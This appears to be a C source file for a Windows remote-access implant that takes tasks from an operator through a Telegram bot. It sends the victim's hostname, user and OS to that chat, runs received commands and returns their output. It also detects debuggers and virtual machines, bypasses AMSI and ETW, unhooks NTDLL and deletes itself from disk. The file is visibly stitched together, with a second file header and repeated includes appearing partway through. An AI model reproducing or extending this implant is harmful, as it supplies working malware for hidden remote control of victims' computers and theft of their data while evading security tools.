/*
 * fitnah_implant.c — RAM-only Telegram C2 implant
 *
 * Build (mingw-w64):
 *   x86_64-w64-mingw32-gcc fitnah_implant.c src/*.c \
 *     -Isrc -O2 -s -mwindows -static -lwininet -lbcrypt -lntdll \
 *     -DFITNAH_BOT_TOKEN="..." -DFITNAH_CHAT_ID="..." \
 *     -DFITNAH_AGENT_ID="..." -DFITNAH_SLEEP=5 -DFITNAH_JITTER=20 \
 *     -o fitnah.exe
 *
 * Compile-time defines (injected by builder/engine.py):
 *   FITNAH_BOT_TOKEN   — Telegram bot token
 *   FITNAH_CHAT_ID     — Per-agent group chat id
 *   FITNAH_AGENT_ID    — Unique agent string
 *   FITNAH_SLEEP       — Base beacon interval (seconds)
 *   FITNAH_JITTER      — Jitter percentage (0-100)
 *   FITNAH_AES_KEY     — 64-char hex AES-256 key (optional; runtime-generated if absent)
 *   FITNAH_AES_NONCE   — 24-char hex nonce seed   (optional)
 *
 * Architecture:
 *   - Single thread; polls getUpdates with long-poll timeout=25s
 *   - Sends CHECKIN on startup so the C2 can register the session
 *   - Each received TASK is dispatched, result sent back as ACK
 *   - Sleep between polls = FITNAH_SLEEP ± FITNAH_JITTER%
 *   - All strings kept in stack or heap — no global .data strings visible
 *   - AMSI + ETW patched before any shell exec
 */

#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <time.h>

#include "src/utils.h"
#include "src/http.h"
#include "src/crypto.h"
#include "src/bypass.h"
#include "src/commands.h"

/* Upgraded evasion layer (Havoc-adapted) */
#include "../fitnah/implant/implant.h"

/* ── Compile-time agent config (set by -D flags) ─────────────────────────── */
#ifndef FITNAH_BOT_TOKEN
#  error "FITNAH_BOT_TOKEN must be defined at compile time"
#endif
#ifndef FITNAH_CHAT_ID
#  error "FITNAH_CHAT_ID must be defined at compile time"
#endif
#ifndef FITNAH_AGENT_ID
#  define FITNAH_AGENT_ID "agent-unknown"
#endif
#ifndef FITNAH_SLEEP
#  define FITNAH_SLEEP 5
#endif
#ifndef FITNAH_JITTER
#  define FITNAH_JITTER 20
#endif

/* Stringify helper for -D values */
#define _STR(x) #x
#define STR(x)  _STR(x)

static const char *g_token    = STR(FITNAH_BOT_TOKEN);
static const char *g_chat_id  = STR(FITNAH_CHAT_ID);
static const char *g_agent_id = STR(FITNAH_AGENT_ID);
static const int   g_sleep    = FITNAH_SLEEP;
static const int   g_jitter   = FITNAH_JITTER;

/* ── Jittered sleep ──────────────────────────────────────────────────────── */
static void sleep_jittered(void) {
    int delta = (int)(g_sleep * (g_jitter / 100.0));
    int lo    = g_sleep - delta;
    int hi    = g_sleep + delta;
    if (lo < 1) lo = 1;
    int ms = (lo + (rand() % (hi - lo + 1))) * 1000;
    /* FoliageSleep: RC4-encrypts image during sleep, decrypts on wake.
       Falls back to plain Sleep() if FoliageInit() was not called. */
    FoliageSleep((DWORD)ms);
}

/* ── Send a text message to the operator chat ────────────────────────────── */
static void tg_send(const char *text) {
    char body[65536];
    int  pos = 1;
    body[0]  = '{';
    pos = json_add_str(body, pos, sizeof(body), "chat_id", g_chat_id);
    body[pos++] = ',';
    pos = json_add_str(body, pos, sizeof(body), "text", text);
    body[pos++] = '}';
    body[pos]   = '\0';
    HttpResponse r = tg_post(g_token, "sendMessage", body);
    http_response_free(&r);
}

/* ── Build and send CHECKIN message ─────────────────────────────────────────
 *
 * CHECKIN JSON:
 * {
 *   "type":     "CHECKIN",
 *   "agent_id": "<id>",
 *   "hostname": "<name>",
 *   "os":       "<caption>",
 *   "arch":     "<x64|x86>",
 *   "username": "<domain\\user>",
 *   "ip":       "<ipv4>"
 * }
 */
static void send_checkin(void) {
    char hostname[256]  = {0};
    char username[256]  = {0};
    char domain[256]    = {0};
    DWORD hsz = sizeof(hostname);
    DWORD usz = sizeof(username);
    DWORD dsz = sizeof(domain);
    GetComputerNameA(hostname, &hsz);
    GetUserNameA(username, &usz);
    /* get domain from env */
    GetEnvironmentVariableA("USERDOMAIN", domain, dsz);

    char fulluser[512];
    snprintf(fulluser, sizeof(fulluser), "%s\\%s", domain, username);

    /* get OS from registry */
    char os_name[256] = "Windows";
    HKEY hk;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                      "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                      0, KEY_READ, &hk) == ERROR_SUCCESS) {
        DWORD sz = sizeof(os_name);
        RegQueryValueExA(hk, "ProductName", NULL, NULL,
                         (LPBYTE)os_name, &sz);
        RegCloseKey(hk);
    }

    /* architecture */
    BOOL wow64 = FALSE;
    IsWow64Process(GetCurrentProcess(), &wow64);
    const char *arch = wow64 ? "x86_on_x64" :
#ifdef _WIN64
        "x64";
#else
        "x86";
#endif

    char body[4096];
    int  pos = 1;
    body[0]  = '{';
    pos = json_add_str(body, pos, sizeof(body), "type",     "CHECKIN");  body[pos++]=',';
    pos = json_add_str(body, pos, sizeof(body), "agent_id", g_agent_id); body[pos++]=',';
    pos = json_add_str(body, pos, sizeof(body), "hostname", hostname);    body[pos++]=',';
    pos = json_add_str(body, pos, sizeof(body), "os",       os_name);    body[pos++]=',';
    pos = json_add_str(body, pos, sizeof(body), "arch",     arch);       body[pos++]=',';
    pos = json_add_str(body, pos, sizeof(body), "username", fulluser);   body[pos++]=',';
    pos = json_add_str(body, pos, sizeof(body), "chat_id",  g_chat_id);
    body[pos++]='}'; body[pos]='\0';

    HttpResponse r = tg_post(g_token, "sendMessage", body);
    http_response_free(&r);
}

/* ── Send ACK for a completed task ──────────────────────────────────────────
 *
 * ACK JSON:
 * {
 *   "type":   "ACK",
 *   "id":     "<task_id>",
 *   "status": "ok",
 *   "output": "<result>"
 * }
 */
static void send_ack(const char *task_id, const char *output) {
    char body[65536];
    int  pos = 1;
    body[0]  = '{';
    pos = json_add_str(body, pos, sizeof(body), "type",   "ACK");    body[pos++]=',';
    pos = json_add_str(body, pos, sizeof(body), "id",     task_id);  body[pos++]=',';
    pos = json_add_str(body, pos, sizeof(body), "status", "ok");     body[pos++]=',';
    pos = json_add_str(body, pos, sizeof(body), "output", output);
    body[pos++]='}'; body[pos]='\0';
    tg_send(body);
}

/* ── Parse a Telegram update and extract the TASK if present ────────────── */
static Task *parse_task(const char *update_json) {
    /* updates arrive as Telegram Update objects; message.text contains JSON */
    char *msg_text = json_get_str(update_json, "text");
    if (!msg_text) return NULL;

    char *type = json_get_str(msg_text, "type");
    if (!type || strcmp(type, "TASK") != 0) {
        free(type); free(msg_text);
        return NULL;
    }
    free(type);

    Task *t = calloc(1, sizeof(Task));
    t->id        = json_get_str(msg_text, "id");
    t->command   = json_get_str(msg_text, "command");
    t->args_json = json_get_str(msg_text, "args");
    free(msg_text);

    if (!t->id || !t->command) {
        task_free(t); free(t);
        return NULL;
    }
    return t;
}

/* ── Main beacon loop ────────────────────────────────────────────────────── */
static void beacon_loop(void) {
    long long offset = 0;

    for (;;) {
        /* Build getUpdates request */
        char body[512];
        snprintf(body, sizeof(body),
                 "{\"offset\":%lld,\"timeout\":25,"
                 "\"allowed_updates\":[\"message\"]}", offset);

        HttpResponse r = tg_post(g_token, "getUpdates", body);
        if (!r.body) { sleep_jittered(); continue; }

        /* Parse result array — find all update objects */
        const char *p = r.body;
        while ((p = strstr(p, "\"update_id\":")) != NULL) {
            long long uid = json_get_int(p, "update_id");
            if (uid >= offset) offset = uid + 1;

            /* Extract the message sub-object */
            const char *msg_start = strstr(p, "\"message\":{");
            if (!msg_start) { p++; continue; }
            /* Find matching closing brace (simplified — handles one level) */
            const char *msg_body = msg_start + 10; /* skip "message": */

            Task *t = parse_task(msg_body);
            if (t) {
                char *result = cmd_dispatch(t);
                send_ack(t->id, result ? result : "");
                free(result);
                task_free(t);
                free(t);
            }
            p++;
        }
        http_response_free(&r);
        sleep_jittered();
    }
}

/*
 * fitnah_implant.c — APT-grade RAM-only Telegram C2 implant
 */

#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <time.h>
#include <tlhelp32.h>

#include "src/utils.h"
#include "src/http.h"
#include "src/crypto.h"
#include "src/bypass.h"
#include "src/commands.h"

// External module unhooking (from unhook.c)
extern BOOL UnhookNtdll();

// External direct syscall initialization (from direct_syscall.c)
extern BOOL Syscall_Initialize();

/* ── Anti-Analysis Logic ─────────────────────────────────────────────────── */

/**
 * IsDebuggerPresent_Custom - Check for debuggers using PEB and timing
 */
BOOL IsDebuggerPresent_Custom() {
    // 1. PEB BeingDebugged flag
    #ifdef _WIN64
        unsigned char debugged = *(unsigned char*)(__readgsqword(0x60) + 2);
    #else
        unsigned char debugged = *(unsigned char*)(__readfsdword(0x30) + 2);
    #endif
    if (debugged) return TRUE;

    // 2. Timing check (RDTSC)
    unsigned __int64 t1 = __rdtsc();
    GetTickCount();
    unsigned __int64 t2 = __rdtsc();
    if ((t2 - t1) > 0x100000) return TRUE;

    return FALSE;
}

/**
 * IsVirtualMachine - Check for VM artifacts
 */
BOOL IsVirtualMachine() {
    // Check for common VM processes
    const char* vm_procs[] = { "vmsrvc.exe", "vmusrvc.exe", "vboxtray.exe", "vmtoolsd.exe", "df5serv.exe", "vboxservice.exe" };
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe)) {
        do {
            for (int i = 0; i < 6; i++) {
                if (_stricmp(pe.szExeFile, vm_procs[i]) == 0) {
                    CloseHandle(hSnapshot);
                    return TRUE;
                }
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return FALSE;
}

/* ── Self-Deletion (Melt) Logic ───────────────────────────────────────────── */

/**
 * Melt - Delete the implant from disk while running
 */
VOID Melt() {
    CHAR szPath[MAX_PATH];
    CHAR szCmd[MAX_PATH * 2];
    GetModuleFileNameA(NULL, szPath, MAX_PATH);

    // Use cmd.exe to wait for the process to exit and then delete the file
    snprintf(szCmd, sizeof(szCmd), "/c timeout /t 3 & del /f /q \"%s\"", szPath);
    ShellExecuteA(NULL, "open", "cmd.exe", szCmd, NULL, SW_HIDE);
    ExitProcess(0);
}

/* ── Entry point ─────────────────────────────────────────────────────────── */
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;

    // 1. Anti-Analysis Check
    if (IsDebuggerPresent_Custom() || IsVirtualMachine()) {
        // Exit silently or perform decoy actions
        return 0;
    }

    // 2. Initialize indirect syscalls + stack spoof + Foliage + HwBp AMSI/ETW bypass
    if (!ImplantInit()) return 1;

    // 3. Unhook NTDLL by reading a clean copy from disk
    extern BOOL UnhookNtdll();
    UnhookNtdll();

    // 4. Fallback byte-patch AMSI + ETW (belt-and-suspenders with HwBp)
    bypass_amsi();
    bypass_etw();

    srand((unsigned)GetTickCount());

    /* 5. Check in with the C2 server */
    send_checkin();

    /* 6. Enter beacon loop — never returns */
    beacon_loop();

    return 0;
}
